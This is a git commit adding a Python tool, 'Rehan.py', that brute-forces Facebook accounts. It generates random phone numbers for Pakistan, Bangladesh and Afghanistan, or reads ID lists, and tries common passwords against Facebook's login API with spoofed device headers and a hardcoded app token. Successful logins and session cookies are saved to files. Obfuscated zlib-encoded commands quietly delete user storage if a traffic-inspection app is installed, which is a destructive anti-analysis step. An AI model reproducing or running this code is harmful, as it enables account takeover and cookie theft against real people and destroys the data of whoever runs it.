4738c9976570722a21ec58a1baecaedf6fa5d1d8
RehanM404 <138994134+RehanM404@users.noreply.github.com>
2023-09-25 15:02:02 +0500

    Add files via upload

---
+++ Rehan.py
@@ -0,0 +1,364 @@
+# Orignally Written By REHAN Khan
+# Totally Written in python
+
+
+samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
+
+import os
+from os import path
+from pathlib import Path
+import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
+
+try:
+	import requests,os,json,time,re,random,sys,uuid,string
+	from string import *
+	from requests import api
+	from concurrent.futures import ThreadPoolExecutor as tred
+except ImportError:
+	os.system('python REHAN.py')
+os.system("clear")
+print('\n\033[1;32m Loading REHAN Tools...')
+#exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11'))
+os.system('xdg-open https://facebook.com/groups/616555880415550/')
+os.system('xdg-open https://chat.whatsapp.com/CCx5u5coOHDAyOKpk9BxD8')
+
+
+try:
+	g = "anar"
+	f="tt"
+	file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
+
+	if f'com.h{f}pc{g}y.pro' in file_d:
+		print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
+		os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
+		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
+		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
+		exit()
+	else:
+		pass
+except Exception as e:
+	pass
+
+def xox(m):
+	for x in m + '\n':
+		sys.stdout.write(x)
+		sys.stdout.flush()
+		time.sleep(0.07)
+
+def clear():
+	os.system('clear')
+	print(logo)
+folder_path = '/sdcard/REHAN'
+try:
+	os.makedirs(folder_path, exist_ok=True)
+except:
+	pass
+oks=[]
+cps=[]
+loop=0
+logo=("""\033[1;37m 
+d8888b. d88888b db   db  .d8b.  d8b   db 
+88  `8D 88'     88   88 d8' `8b 888o  88 
+88oobY' 88ooooo 88ooo88 88ooo88 88V8o 88 
+88`8b   88~~~~~ 88~~~88 88~~~88 88 V8o88 
+88 `88. 88.     88   88 88   88 88  V888 
+88   YD Y88888P YP   YP YP   YP VP   V8P\033[1;32m XD\033[1;37m 
+----------------------------------------------
+\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  REHAN MALIK
+\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  REHAN MALIK
+\033[1;32m•\033[1;37m FRIENDS     \033[1;32m •√\033[1;37m  SHAHID ZARGO
+\033[1;32m•\033[1;37m TOOLS       \033[1;32m •√\033[1;37m  FREE
+\033[1;32m•\033[1;37m VERSION     \033[1;32m •√\033[1;37m  \033[1;32m9.9\033[1;37m 
+------------------------------------------------""")
+
+def linex():
+	print(f'\033[1;37m------------------------------------------------')
+
+def Main_REHAN():
+		clear()
+		print(f'\033[1;37m [1] File Cloning \n [2] Random Cloning \n [3] Gmail Cloning \n [4] WhatsApp group(Join) \n [5] Follow my fb id \n [0] Exit')
+		linex()
+		shm= input('\033[1;37m [+] Select option: ')
+		if shm =='1':
+			file_crack()
+		elif shm =='2':
+			r_crack()
+		elif shm =='3':
+			gmail()
+		elif shm =='4':
+			wp=('KpSthW03CQR0wOim0sKtFX')
+			os.system('xdg-open https://chat.whatsapp.com/CCx5u5coOHDAyOKpk9BxD8')
+			Main_REHAN()
+		elif shm =='5':
+			os.system('xdg-open https://www.facebook.com/aayan.malik.5')
+			Main_REHAN()
+		elif shm =='0':
+			exit(' Thanks For Using our tool ')
+		else:
+			print('\033[1;37m [+] Select valid option\033[1;37m ')
+			time.sleep(0.5)
+			Main_REHAN()
+
+def file_crack():
+	clear()
+	file = input(' [+] Put file path :\033[1;32m ')
+	try:
+		fo = open(file,'r').read().splitlines()
+	except FileNotFoundError:
+		print('\033[1;37m [+] File location not found ');exit()
+	clear()
+	print(' [1] Method 1 ')
+	#print(' [2] Method 2 ')
+	#print(' [3] Method 3 ')
+	#print(' [4] Method 4 ')
+	linex()
+	methd=input('\033[1;37m [+] Select Option: ')
+	plist=[]
+	clear()
+	try:
+		ps_limit = int(input(' How Many Pasword You Want To Add :  '))
+	except:
+		ps_limit =1
+#	linex()
+#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
+	linex()
+	for i in range(ps_limit):
+		plist.append(input(f'\033[1;37m Put Password No.{i+1}: '))
+	with tred(max_workers=30) as REHAN:
+		clear()
+		tl = str(len(fo))
+		print(' Total accounts : \033[1;32m'+tl)
+		print('\033[1;37m Process Running in the Background ')
+		linex()
+		for user in fo:
+			ids,names = user.split('|')
+			passlist = plist
+			if methd =='1':
+				REHAN.submit(api1,ids,names,passlist)
+			else:
+				REHAN.submit(api1,ids,names,passlist)
+	print('\033[1;37m')
+	linex()
+	print(' [+] The process has completed')
+	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input('\033[1;32m [*] Press enter to back \033[1;37m')
+	os.system('python REHAN.py')
+
+def r_crack():
+	clear()
+	print(' [1] Pakistan Cloning ')
+	print(' [2] Bangladesh Cloning ')
+	print(' [3] Afghanistan Cloning ')
+	print(' [0] Back To Menu ')
+	linex()
+	crk=input(' [+] Select Option:\33[1;37m ')
+	if crk =='1':
+		pak()
+	elif crk =='2':
+		bd()
+	elif crk =='3':
+		afg()
+	elif crk =='0':
+		Menu_REHAN()
+	else:
+		print('\n  [+] Select valid option\033[1;37m ');time.sleep(1.5);menu()
+
+def pak():
+	user=[]
+	clear()
+	code = input('\33[1;37m [+] Enter Code :\33[1;37m ')
+	try:
+		limit = int(input(' [+] Enter limit:\33[1;37m '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with tred(max_workers=30) as REHAN:
+		clear()
+		tl = str(len(user))
+		print(' [+] Total accounts : \033[1;32m'+tl)
+		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
+		print('\33[1;37m [+] Process has been started\033[1;97m')
+		linex()
+		for psx in user:
+			ids = code+psx
+			passlist = [psx,ids,'khankhan','khan123','malik123','baloch123','kingkhan','khan12345','malik1234','khanbaba','pak123','pak786','malik1122','khan1122']
+			REHAN.submit(rd1,ids,passlist)
+	print('\033[1;37m')
+	linex()
+	print(' [+] The process has completed')
+	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input(' [+] Press enter to back \033[1;37m')
+	os.system('python REHAN.py')
+
+
+def bd():
+	user=[]
+	clear()
+	code = input(' [+] Enter Code :\33[1;37m ')
+	try:
+		limit = int(input(' [+] Enter limit:\33[1;37m '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(8))
+		user.append(nmp)
+	with tred(max_workers=30) as REHAN:
+		clear()
+		tl = str(len(user))
+		print(' [+] Total accounts : \033[1;32m'+tl)
+		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
+		print('\33[1;37m [+] Process has been started \033[1;97m')
+		linex()
+		for psx in user:
+			ids = code+psx
+			passlist = ['i love you','bangladesh','freefire','bangla123','bangladesh123',ids,psx]
+			REHAN.submit(rd1,ids,passlist)
+	print('\033[1;37m')
+	linex()
+	print(' [+] The process has completed')
+	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input(' [+] Press enter to back \033[1;37m')
+	os.system('python REHAN.py')
+
+def afg():
+	user=[]
+	clear()
+	code = input(' [+] Enter Code :\33[1;37m ')
+	try:
+		limit = int(input(' [+] Enter limit:\33[1;37m '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	with tred(max_workers=30) as REHAN:
+		clear()
+		tl = str(len(user))
+		print(' [+] Total accounts : \033[1;32m'+tl)
+		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
+		print('\33[1;37m [+] Process running in the background\033[1;97m')
+		linex()
+		for psx in user:
+			ids = code+psx
+			passlist = [ids,psx,'100200','afghanistan','Afghan123','afghan1122','kabul123']
+			REHAN.submit(rd1,ids,passlist)
+	print('\033[1;37m')
+	linex()
+	print(' [+] The process has completed')
+	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+	linex()
+	input(' [+] Press enter to back \033[1;37m')
+	os.system('python REHAN.py')
+
+def rd1(ids,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\33[1;37m[REHAN]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		for pas in passlist:
+				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+				fbbv = str(random.randint(000000000,999999999))
+				accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+				fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+				fbbv = str(random.randint(000000000,999999999))
+				fbrv = str(random.randint(000000000,999999999))
+				fbsv = str(random.randint(4,13))+'.0'
+				model,build = random.choice(samsung).split('|')
+				fbmf = 'samsung'
+				fbbd = 'samsung'
+				en = random.choice(['en_US','en_GB'])
+				cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+				network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
+				ua  = "[FBAN/FB4A;FBAV/356.0.0.3.138;FBBV/766769450;FBDM/{density=3.3,width=1080,height=1442};FBLC/en_US;FBRV/335184783;FBCR/EE;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy A7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+				head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+				data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+				po = requests.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
+				if 'session_key' in po:
+						uid = str(po['uid'])
+						ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+						ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+						cookie = f"sb={ssbb};{ckkk}"
+						print('\r\r\033[1;32m[REHAN-OK] '+uid+' | '+pas)
+						#print(' \33[1;96m[Cookies] == '+cookie)
+						file_path_ok = os.path.join(folder_path, 'REHAN_RANDOM_OK.txt')
+						file_path_cookies = os.path.join(folder_path, 'REHAN_COOKIES.txt')
+						with open(file_path_ok, 'a') as file_ok, open(file_path_cookies, 'a') as file_cookies:
+							file_ok.write(uid+'|'+pas+'\n')
+							file_cookies.write(uid+'|'+pas+'|'+cookie+'\n')
+						oks.append(uid)
+						break
+				elif 'www.facebook.com' in po['error']['message']:
+						uid = str(po['error']['error_data']['uid'])
+						#print(f'\r\r\33[1m\33[1;35m [REHAN-CP] '+uid+' | '+pas+'\033[1;97m')
+						file_path = os.path.join(folder_path, 'REHAN-CP.txt')
+						with open(file_path, 'a') as file:
+							file.write(uid+'|'+pas+'\n')
+						cps.append(uid)
+						break
+				else:
+					continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+
+def api1(ids,names,passlist):
+	try:
+		global ok,loop,sim_id
+		sys.stdout.write('\r\r\33[1;37m[REHAN-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		fn = names.split(' ')[0]
+		try:
+			ln = names.split(' ')[1]
+		except:
+			ln = fn
+		for pw in passlist:
+			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+			fbbv = str(random.randint(000000000,999999999))
+			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+			fbbv = str(random.randint(000000000,999999999))
+			fbrv = str(random.randint(000000000,999999999))
+			fbsv = str(random.randint(4,13))+'.0'
+			model,build = random.choice(samsung).split('|')
+			fbmf = 'samsung'
+			fbbd = 'samsung'
+			en = random.choice(['en_US','en_GB'])
+			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
+			ua  = "[FBAN/FB4A;FBAV/356.0.0.3.138;FBBV/766769450;FBDM/{density=3.3,width=1080,height=1442};FBLC/en_US;FBRV/335184783;FBCR/EE;FBMF/Samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Galaxy A7;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
+			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
+			if 'session_key' in po:
+					uid = str(po['uid'])
+					print('\r\r\033[1;32m [REHAN-OK] '+uid+' | '+pas)
+					file_path = os.path.join(folder_path, 'REHAN_FILE_OK.txt')
+					with open(file_path, 'a') as file:
+						file.write(uid+'|'+pas+'\n')
+					oks.append(uid)
+					break
+			elif 'www.facebook.com' in po['error']['message']:
+					uid = str(po['error']['error_data']['uid'])
+					#print(f'\r\r\33[1m\33[1;35m [REHAN-CP] '+uid+' | '+pas+'\033[1;97m')
+					file_path = os.path.join(folder_path, 'REHAN-CP.txt')
+					with open(file_path, 'a') as file:
+						file.write(uid+'|'+pas+'\n')
+					cps.append(uid)
+					break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
+
+Main_REHAN()
